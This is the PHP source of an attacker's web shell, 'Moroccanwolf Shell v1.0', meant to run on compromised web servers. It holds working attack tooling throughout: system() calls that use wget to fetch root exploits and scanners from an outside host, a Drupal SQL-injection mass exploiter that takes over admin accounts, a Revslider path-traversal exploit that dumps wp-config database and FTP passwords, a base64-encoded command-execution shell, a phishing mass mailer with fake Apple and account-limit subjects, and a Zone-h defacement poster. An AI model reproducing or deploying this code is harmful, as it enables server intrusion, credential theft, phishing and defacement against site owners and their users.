<?php
set_time_limit(0);
# error_reporting(0);
echo '
<HTML><HEAD><link href="" rel="stylesheet" type="text/css"><title>Moroccanwolf Shell v1.0</title><style>
body{direction: ltr;background-image: url("http://www.exploit4arab.net/themes/default/style/img/bg.png");background-attachment:fixed;background-position: center; }
.navbar{font-size:12px;background:#CCCCCC;padding:5px 5px 5px 5px;}
.navbar ul{margin:0;padding:0;}
.navbar ul li{list-style:none;float:left;margin-left:5px;}
.navbar ul li a{display: inline-block;text-decoration:none;color:#333;background:#ccc;border: 1px solid #aaa;text-shadow: 1px 1px 2px #FFF;padding: 0.45em 0.8em;background: -webkit-gradient(linear, left top, left bottom, from(#F2F2F2), to(#CCCCCC));background: -moz-linear-gradient(top, #F2F2F2, #CCCCCC);-moz-border-radius: 0.3em;-wekit-border-radius: 0.3em;border-radius: 0.3em;cursor:pointer}
.navbar ul li a:hover{color:#000; border-color: #888;}
.body{padding:10px;background:#FFFFFF;}
.title{margin:0;padding:0;margin: 10px 0 5px 0px;font-family:arial;font-size:18px;font-weight:bold;}
tr:hover{background:#ddd;}
.trhead,.trhead:hover{background:-moz-linear-gradient(center top , #EEEEEE, #AAAAAA);background:-webkit-linear-gradient(#EEEEEE, #AAAAAA);}
tr,td{border-collapse: collapse;border:1px solid #aaa;color :#363636;}
td{padding:3px;color:#0076B1;text-shadow:0px 0px 10px #708090;display: inline;font-family: cursive;font-size: 18px;font-weight: bold;height:
auto;text-align: -webkit-center;width: auto;}
td a{color:#0076B1;text-shadow:0px 0px 10px #708090;}
a{color:black;text-shadow:0px 0px 10px #708090;text-decoration:none;}
a:hover{color:#0076B1;text-decoration:none;text-shadow:0px 0px 10px #708090;}
td a:hover{color:#0076B1;text-decoration:none;}
input[type=submit]{ padding: 3px; color: #00770;font-weight: bold; text-align: center; text-shadow: 0 1px rgba(255, 255, 255, 0.3);background: #aeaeae; background-clip: padding-box; border: 1px solid #284473; border-bottom-color: #223b66; border-radius: 4px;  cursor: pointer;background-image:-webkit-linear-gradient(top, #eaeaea, #d0d0d0);background-image: -moz-linear-gradient(top, #eaeaea, #d0d0d0);background-image: -o-linear-gradient(top, #eaeaea, #d0d0d0); background-image: linear-gradient(to bottom, #eaeaea, #d0d0d0); -webkit-box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15);  box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); } 
input[type=text]{ padding: 3px; color: #0076B1; text-shadow: #0076B1 0px 0px 3px; border: 1px solid #0076B1; background: transparent; box-shadow: 0px 0px 4px #0076B1;    padding: 3px;   -webkit-border-radius: 4px;   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgb(85,85,85) 0px 0px 4px;   -moz-box-shadow: #0076B1 0px 0px 4px;} 
table{border-collapse: collapse;border:1px solid #EEEEEE !important;}
input,select,textarea{background-color: transparent;border: 1px #000000 solid;-moz-border-radius: 5px;-webkit-border-radius:5px;border-radius:5px;margin:0 auto;color: #0076B1;text-shadow: #0076B1 0px 0px 3px;border: 1px solid #0076B1;}
footer{font-size:80%;text-align:center;border-top:1px solid #ccc;padding:5px;}
.clr{clear:both;}h5{text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 17px;color: #0076B1;text-shadow: 0px 0px 10px #708090;}h1{text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 35px;color: #0076B1;text-shadow: 0px 0px 10px #708090;}
h4{text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 15px;color: #0076B1;text-shadow: 0px 0px 10px #708090;}
h6{text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 20px;color: rgb(255, 0, 0);}h2{text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 15px;color: #0076B1; }h2 a {text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 15px;color: #0076B1;}#content tr:hover{text-shadow:0px 0px 10px #fff;}#content .first{background-color: silver;}#content .first:hover{background-color: silver;text-shadow:0px 0px 1px #757575;}.mekki a {text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 17px;color: #0076B1;text-shadow: 0px 0px 10px #708090;}h3{text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 10px;color: #0076B1;}h3 a {text-decoration: none;font-family: Tahoma, Arial, sans-serif;font-size: 10px;color: #0076B1;}
</style><body><center><font style="color: rgb(255, 255, 255);" color="#000000" size="7">Moroccanwolf</font>&nbsp;<font color="#ff0000" size="6">Shell v1.0
';
 if(isset($_GET['path'])){$path = $_GET['path'];   }else{$path = getcwd();}
$path = str_replace('\\','/',$path);$paths = explode('/',$path);
$lol = htmlentities($_SERVER['PHP_SELF']);
echo '<br><h3>uname:'.php_uname()."<br>\n";echo "<h3>pwd:";foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){$a = true;echo '<a href="?path=/">/</a>';continue; }
if($pat == '') continue;echo '<a href="?file&path=';for($i=0;$i<=$id;$i++){echo "$paths[$i]";if($i != $id) echo "/";}echo '">'.$pat.'</a>/';}
echo "</h3>";echo '<form method="POST"><div class="navbar"><ul><center>';echo "
                 <ul><center>
   
                                       <li><a name='home' href='?home'><font><font>Home</font></font></a></li>
                                        <li><a  href='?file&path=$path'><font><font>file Manager</font></font></a></li>
                                        <li><a  href='?mass'><font><font>Mass</font></font></a></li>
                                        <li><a href='?bcon'><font><font>Back Connect </font></font></a></li>
                                        <li><a href='?tools'><font><font class=''>Tools</font></font></a></li>
                                                        
                    <li><a href='?cgi'><font><font>CgiShell</font></font></a></li>
                    <li><a href='?sym'><font><font>Symlink</font></font></a></li>
                   <li><a href='?mailer'><font><font class=''>Mailer</font></font></a></li>
                   <li><a name='upload' href='?auto'><font><font>Auto r00t</font></font></a></li>
                                        <li><a name='upload' href='?upload'><font><font>Upload</font></font></a></li>
                                       
                                        <li><a href='?exploiter'><font><font class=''>Exploiter & scan Tools</font></font></a></li>
                     <li><a href='?kill'><font><font>Self remove</font></font></a></li><li><a name='about' href='?about'><font><font>About</font></font></a></li>                               <center> </ul>
<div class='clr'></div></div></body></form>";

if (isset($_GET['mailer'])){
echo "<h6>Mailer</h6>";
$testa = $_POST['veio'];
if($testa != "") {
$message = $_POST['html'];
$subject = $_POST['assunto'].$_POST['assunto2'];
$nome = $_POST['nome'];
$de = $_POST['de'];
$to = $_POST['emails'];
$email = explode("\n", $to);
$message = stripslashes($message);
$i = 0;
$count = 1;
while($email[$i]) {
$ok = "ok";
$headers  = "MIME-Version: 1.0\n";
$headers .= "Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit
X-Mailer: EDMAIL R6.00.02
Content-Length: 41061\n";
$headers .= "From: ".$email[$i]."\r\n";
if(mail($email[$i], $subject, $message, $headers))
echo "<center><font face=Arial size=2 color=898989>| Numero : [$count] <b>".$email[$i]."</b>: <font face=Arial size=2 color=#0982ba>Sent . . . *o*</font><br><hr class=style-three></center>";
else
echo "<center><font face=Arial size=2 color=898989>| Numero : [$count] <b>".$email[$i]."</b>: <font face=Arial size=2 color=#b41420>Error in Sending ? :(</font><br><hr class=style-three></center>";
$i++;
$count++;
}
$count--;
if($ok == "ok")
echo ""; 

}
?>
<body><center><form action="" method="post" enctype="multipart/form-data" name="form1"><div class="style2"><input type="hidden" name="veio" value="sim">
<tr><center>
<table style="width: 100%"></center>
<tr>
<td style="width: 1686px">
<center><table border="0" width="80%" bordercolorlight="#0076B1" bordercolordark="#0076B1" style="border: 1px solid #0076B1; border-radius:4px;" bgcolor="#222222" > 
<td height="25" align="center" bgcolor="#222222" style="width: 849px"></td><tr align="center"> 
<td style="width: 849px" ><font class="fontx1">
</td>
</center>
</tr>
<tr>
<td height="194" valign="top" bgcolor="#222222" style="width: 849px">
<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
<tr><td height="17" class="style1"><b><font face:Tahoma, Geneva, sans-serif; color="#0076B1" size="2pt">| SUBJECT :</font></b></td>
<td height="17"><select name="assunto" id="assunto" class="form2" style="width: 250px">
<option selected value="">Select Title</option>
<option value="Test Test">Test Test</option>
<option value="Apple Expiration de Votre Compte Ref : MNE0-13NB">Apple Expiration de Votre Compte Ref : MNE0-13NB</option>
<option value="You may to Update Your Account ID">You may to Update Your Account ID</option>
<option value="Update your account information">Update your account information</option>
<option value="Your account has been limited until we hear from you">Your account has been limited until we hear from you</option>
</select><font class="fontx1"> OR <input name="assunto2" id="assunto" class="form2" type="text" style="width: 280px">
</td></tr><tr align="center" bgcolor="#007700">
<td height="20" colspan="2" bgcolor="#222222" class="style1"><b><font face:Tahoma, Geneva, sans-serif; color="#0076B1" size="2pt">
|LETTER :</font></b></td></tr>
<tr align="right">
<td height="146" colspan="2" valign="top"><br>
<textarea class="area" name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html" cols="20"></textarea>
<b><font face:Tahoma, Geneva, sans-serif; color="#0076B1" size="2pt">| Reminder : Text HTML |</font></b></td>
</tr><tr align="center" bgcolor="#222222">
<td height="10" colspan="2" class="style1"><b><font face:Tahoma, Geneva, sans-serif; color="#0076B1" size="2pt">
| MAILING LIST :</font></b></tr>
<tr align="right">
<td height="136" colspan="2" valign="top"><br>
<textarea class="area" name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails" cols="20">
moroccanxhack@gmail.com</textarea>
<b><font face:Tahoma, Geneva, sans-serif; color="#0076B1" size="2pt">| Mail List |</font></b> </td>
</tr><tr>
<td height="26" valign="top" colspan="2" class="style1"><input class="button grey" type="submit" name="Submit" value="Send Message"></td>
</tr></table></td></tr></table></center><br><br></td>
</div>
</form>
</body>
<?php

}
if (isset($_GET['auto'])){

echo'
<h6>Auto Root (2012-2013-2014-2015) </h6>
<form method="POST">
<input type="text" name="command" value="wget http://moroccanwolf.com/autoroot.txt -O root.php" size="43">
<input type="submit" name="done" value="Execute">
</form>
';
$cmd = $_POST['command'];
if ($_POST['done']){

@mkdir('auto', 0755);
@chdir('auto');

@system("$cmd");

echo "<h3>DOne /auto/root.php</h3>";
echo "<h3>use back-connect and cd /auto/root.php , chmod +x root.php , ./root.php</h3>";

}

}




if (isset($_GET['exploiter']) && $_GET['exploiter'] == ""){
echo '
<h2>
<a href="?exploiter=dru">Drupal Exploiter</a><br><br>
<a href="?exploiter=mul">Multi Scan (python)</a><br></br>
<a href="?exploiter=rvs">Revslider Exploit<br><br>
</h2>
';

echo '
<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
';

}

if (isset($_GET['exploiter']) && $_GET['exploiter'] == "mul"){

echo '
<h2>
<a href="?exploiter=dru">Drupal Exploiter</a>-
<a href="?exploiter=mul">Multi Scan (python)</a>-
<a href="?exploiter=rvs">Revslider Exploit</a>-</h2>
';

echo'
<h6>Multi Scan Download  </h6>
<form method="POST">
<input type="text" name="command" value="wget http://moroccanwolf.com/scan.txt -O scan.py" size="43">
<input type="submit" name="done" value="Execute">
</form>
';

$cmd = $_POST['command'];
if ($_POST['done']){

@mkdir('multi', 0755);
@chdir('multi');

@system("$cmd");

echo "<h3>DOne /multi/scan.py</h3>";
echo "<h3>use Back connect and do cd /multi/scan.py && chmod +750 && ./scan.py </h3>";

}

echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';


}

elseif (isset($_GET['exploiter']) && $_GET['exploiter'] == "dru"){

echo '
<h2>
<a href="?exploiter=dru">Drupal Exploiter</a>-
<a href="?exploiter=mul">Multi Scan (python)</a>-
<a href="?exploiter=rvs">Revslider Exploit</a>-
</h2>
';

?>
<h6>Drupal Mass exploiter</h6>
<form method='post' ><center>
<textarea cols='80' rows='30' name='sites'  size="60" >
ur sites ...
</textarea><br><br>
<input type='submit' name='lover' value='Exploit' ><br>
</center>
</form>
	<br>
<?php
if(isset($_POST['lover'])){

	$target = explode("\r\n",$_POST['sites']);;
	foreach($target as $url){
	$url = @trim($url);
	$post_data = "name[0;update users set name %3D 'rummykhan' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
	$params = array(
		'http' => array(
		'method' => 'POST',
		'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
		'content' => $post_data
		)
	);
	$ctx = stream_context_create($params);
	$data = file_get_contents($url . '/user/login/', null, $ctx);
 	echo "<h3>Testing at \"/user/login/</h3>\"";
	if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data)|| (stristr($data, 'FcUk Crap') && $data)) {
		echo "Success! Log in with username \"rummykhan\" and password \"admin\" at {$url}/user/login";
	} else {
		echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
	}
}

if(isset($_GET['submit'])){

	$url = "http://".$_GET['url']."/";
	$post_data = "name[0;update users set name %3D 'rummykhan' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
	$params = array(
		'http' => array(
		'method' => 'POST',
		'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
		'content' => $post_data
		)
	);
	$ctx = stream_context_create($params);
	$data = file_get_contents($url . '?q=node&destination=node', null, $ctx);
 	echo "<h3>Testing at \"Index</h3>\"";
	if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
		echo "Success! Log in with username \"rummykhan\" and password \"admin\" at {$url}/user/login";
	} else {
		echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
	}
}
}

echo '
<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
';
}

elseif (isset($_GET['exploiter']) && $_GET['exploiter'] == "rvs"){

echo '
<h2>
<a href="?exploiter=dru">Drupal Exploiter</a>-
<a href="?exploiter=mul">Multi Scan (python)</a>-
<a href="?exploiter=rvs">Revslider Exploit</a>-
</h2>
';
echo "<center><h6>Revslider Exploit</h6><form method='post'>
<textarea name='sites' cols='50' rows='12'></textarea><br>
<input type='submit' name='go' value='get'>
</form>";
function findit($mytext,$starttag,$endtag) {
 $posLeft  = stripos($mytext,$starttag)+strlen($starttag);
 $posRight = stripos($mytext,$endtag,$posLeft+1);
 return  substr($mytext,$posLeft,$posRight-$posLeft);
}
error_reporting(0);
set_time_limit(0);
$ya=$_POST['go'];
$co=$_POST['sites'];

if($ya){
 $e=explode("\r\n",$co);
 foreach($e as $bda){
	//echo '<br>'.$bda;
	$linkof='/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
	$dn=($bda).($linkof);
	$file=@file_get_contents($dn);
	if(eregi('DB_HOST',$file) and !eregi('FTP_USER',$file) ){
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
	echo "<center><font face='courier' color='#00BFFF' >".$bda."</font></center>";
	echo "<font face='courier' color=lime >DB name : </font>".findit($file,"DB_NAME', '","');")."<br>";
	echo "<font face='courier' color=lime >DB user : </font>".findit($file,"DB_USER', '","');")."<br>";
	echo "<font face='courier' color=lime >DB pass : </font>".findit($file,"DB_PASSWORD', '","');")."<br>";
	echo "<font face='courier' color=lime >DB host : </font>".findit($file,"DB_HOST', '","');")."<br>";
	}
	elseif(eregi('DB_HOST',$file) and eregi('FTP_USER',$file)){
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
	echo "<center><font face='courier' color='#00BFFF' >".$bda."</font></center>";
	echo "<font face='courier' color=lime >FTP user : </font>".findit($file,"FTP_USER','","');")."<br>";
	echo "<font face='courier' color=lime >FTP pass : </font>".findit($file,"FTP_PASS','","');")."<br>";
	echo "<font face='courier' color=lime >FTP host : </font>".findit($file,"FTP_HOST','","');")."<br>";
	}
	else{echo "<center><font face='courier' color='yellow' >".$bda." ----> not infected </font></center>";}
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
 }
 
}


echo '
<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
';
}


echo '<h3>';
if (isset($_GET['tools']) && $_GET['tools'] == ""){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a><br><br>
<a href="?tools=whm">whmcs Killer</a><br><br>
<a href="?tools=cnf">Config Grabber bypass </a><br><br>
<a href="?tools=znh">Zone-h Notifier</a><br><br>
<a href="?tools=wri">Locate [W/R]  Dir</a><br><br>
<a href="?tools=con">Mysql Connect (mysql Command)</a><br><br>
<a href="?tools=con1">Mysql Connect (normal)</a><br><br>
<a href="?tools=rev">reverse ip lookup</a><br><br>
<a href="?tools=rjom">Ip reverse Joomla</a><br><br>
<a href="?tools=rwp">Ip reverse wordpress</a><br><br>
</h2>
';


echo '
<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
';

}
if (isset($_GET['tools']) && $_GET['tools'] == "cmd"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a>
</h2>
';



$kkk ="
PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmgzIHsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogMTBweDsNCiAgY29sb3I6ICMwMDc2QjE7DQogIA0KfQ0KLmFyZWEgew0KICBjb2xvcjogIzAwNzZCMTsNCiAgZm9udC1zaXplOiA5cHQ7DQogIHRleHQtc2hhZG93OiAjMDA3NkIxIDBweCAycHggN3B4Ow0KICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsNCiAgcGFkZGluZzogM3B4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA7DQp9DQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7DQogIGZvbnQtd2VpZ2h0OiBib2xkOyANCnRleHQtYWxpZ246IGNlbnRlcjsgDQogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsNCiAgYmFja2dyb3VuZDogI2FlYWVhZTsgDQogYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgDQogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgDQogYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgDQogYm9yZGVyLXJhZGl1czogNHB4OyAgDQpjdXJzb3I6IHBvaW50ZXI7ICANCmJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7IA0KIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSANCg0KaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzZCMTsgdGV4dC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc2QjE7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NkIxOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCA0cHg7fSANCg0KDQoNCg0KPC9zdHlsZT4NCjw/cGhwDQplY2hvICcNCjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9R0VUPg0KPHA+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0idGV4dCIgdmFsdWU9InB5dCIgY29scz0iNzAiID4nOw0KDQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48L3N0cm9uZz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0idnciIHNpemU9IjUwIiB2YWx1ZT0iY21kIj4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiIHNpemU9IjQzIj4gPHNlbGVjdCBuYW1lPWV4ZWNtZXRob2Q+DQo8b3B0aW9uIHZhbHVlPSJzeXN0ZW0iPlN5c3RlbTwvb3B0aW9uPiAgPG9wdGlvbiB2YWx1ZT0iZXhlYyI+RXhlYzwvb3B0aW9uPiAgPG9wdGlvbiB2YWx1ZT0icGFzc3RocnUiPlBhc3N0aHJ1PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0icG9wZW4iPnBvcGVuPC9vcHRpb24+DQo8L3NlbGVjdD4gPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ia2trIiB2YWx1ZT0iRXhlY3V0ZSI+DQo8L3A+PC9mb3JtPic7DQoNCj8+";



$file = fopen("mwolf.php" ,"w+");
$write = fwrite ($file ,base64_decode($kkk));
fclose($file);
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900"><h6>Command Execution</h6></span><center><center><br><iframe src=mwolf.php width=75% height=70% frameborder=0></iframe></div></center>'; 
echo '<h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
}
elseif (isset($_GET['tools']) && $_GET['tools'] == "whm"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';

echo'
<h6>Whmcs Killer Download : </h6>
<form method="POST">
<input type="text" name="command" value="wget http://moroccanwolf.com/wkv3.txt -O killer.php" size="43">
<input type="submit" name="done" value="Execute">
</form>
';

$cmd = $_POST['command'];
if ($_POST['done']){

@mkdir('whmcs', 0755);
@chdir('whmcs');

@system("$cmd");

echo "<h3>DOne /whmcs/killer.php</h3>";


}
echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
}
elseif (isset($_GET['tools']) && $_GET['tools'] == "znh"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';

echo "<h6>Zone-h notifier</h6>";
ob_start();

$sub = get_loaded_extensions();

if(!in_array("curl", $sub)){

die('Can not connect to this server to reconnect to the server ip_address');

}




if($_POST) {

$hacker = $_POST['defacer'];

$method = $_POST['hackmode'];

$neden = $_POST['reason'];

$site = $_POST['domain'];



if ($hacker == "") {



die ("<center>Which distorted and said that if the answer is yes, type the name of<center>");

}

elseif($method == "--------SELECT--------") {

die("<center>Method must be told</center>");

}

elseif($neden == "--------SELECT--------") {



die("<center>Why do I have to tell</center>");

}

elseif($site == "") {



die("<center>Registration continued breakthroughs in the locations Zone H </center>");

}





$i = 0;

$sites = explode("\n", $site);

while($i < count($sites)) {

if(substr($sites[$i], 0, 4) != "http") {

$sites[$i] = "http://".$sites[$i];



}



poster("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);



++$i;

}

echo "<center><p>Zone-h Mass Deface Poster {Moroccanwolf}</p></center>";



}else{



echo '<h3><center>


<form action="" method="post">

<div id="option">

<p>Defacer<br />

<span class="ok"><input type="text" name="defacer" value=" Moroccanwolf" size="40" /></span> </p>



<p>How to hack <br /><select name="hackmode">

<option >--------SELECT--------</option>

<option value="1">known vulnerability (i.e. unpatched system)</option>

<option

value="2" >undisclosed (new) vulnerability</option>

<option

value="3" >configuration / admin. mistake</option>

<option

value="4" >brute force attack</option>



<option

value="5" >social engineering</option>

<option

value="6" >Web Server intrusion</option>

<option

value="7" >Web Server external module intrusion</option>

<option

value="8" >Mail Server intrusion</option>

<option

value="9" >FTP Server intrusion</option>

<option

value="10" >SSH Server intrusion</option>



<option

value="11" >Telnet Server intrusion</option>

<option

value="12" >RPC Server intrusion</option>

<option

value="13" >Shares misconfiguration</option>

<option

value="14" >Other Server intrusion</option>

<option

value="15" selected="selected">SQL Injection</option>

<option

value="16" >URL Poisoning</option>



<option

value="17" >File Inclusion</option>

<option

value="18" >Other Web Application bug</option>

<option

value="19" >Remote administrative panel access through bruteforcing</option>

<option

value="20" >Remote administrative panel access through password guessing</option>

<option

value="21" >Remote administrative panel access through social engineering</option>

<option

value="22" >Attack against the administrator/user (password stealing/sniffing)</option>



<option

value="23" >Access credentials through Man In the Middle attack</option>

<option

value="24" >Remote service password guessing</option>

<option

value="25" >Remote service password bruteforce</option>

<option

value="26" >Rerouting after attacking the Firewall</option>

<option

value="27" >Rerouting after attacking the Router</option>

<option

value="28" >DNS attack through social engineering</option>



<option

value="29" >DNS attack through cache poisoning</option>

<option

value="30" >Not available</option>

</select></p>

<p> Cause of hack ? <br /><select name="reason">



<option >--------SELECT--------</option>

<option

value="1" selected="selected" >Heh...just for fun!</option>

<option

value="2" >Revenge against that website</option>

<option

value="3" >Political reasons</option>

<option

value="4" >As a challenge</option>

<option

value="5" >I just want to be the best defacer</option>



<option

value="6" >Patriotism</option>

<option

value="7" >Not available</option>

</select> </p>



<p>Sites <br />

<span class="fur">Put all the sites on the server</span><br />

